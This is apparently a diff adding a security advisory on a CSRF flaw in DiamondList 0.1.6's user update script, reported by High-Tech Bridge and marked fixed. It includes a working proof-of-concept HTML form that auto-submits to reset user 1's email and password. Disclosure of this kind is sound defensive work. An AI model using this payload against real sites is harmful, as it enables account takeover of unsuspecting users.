@@ -1,0 +1,32 @@
+Vulnerability ID: HTB22517
+Reference: http://www.htbridge.ch/advisory/xsrf_csrf_in_diamondlist.html
+Product: DiamondList
+Vendor: Hulihan Applications ( http://hulihanapplications.com/projects/diamondlist )
+Vulnerable Version: 0.1.6 and Probably Prior Versions
+Vendor Notification: 22 July 2010
+Vulnerability Type: CSRF (Cross-Site Request Forgery)
+Status: Fixed by Vendor
+Risk level: Low
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+The vulnerability exists due to failure in the "user/main/update_user" script to properly verify the source of HTTP request.
+
+Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+Attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/user/main/update_user/1" method="post" name="main" >
+
+<input type="hidden" name="user[email]" value="admin (at) example (dot) com [email concealed]" />
+<input type="hidden" name="user[first_name]" value="First Name" />
+<input type="hidden" name="user[last_name]" value="Last Name" />
+<input type="hidden" name="user[password]" value="1234" />
+<input type="hidden" name="user[password_confirmation]" value="1234" />
+<input type="hidden" name="commit" value="Update" />
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
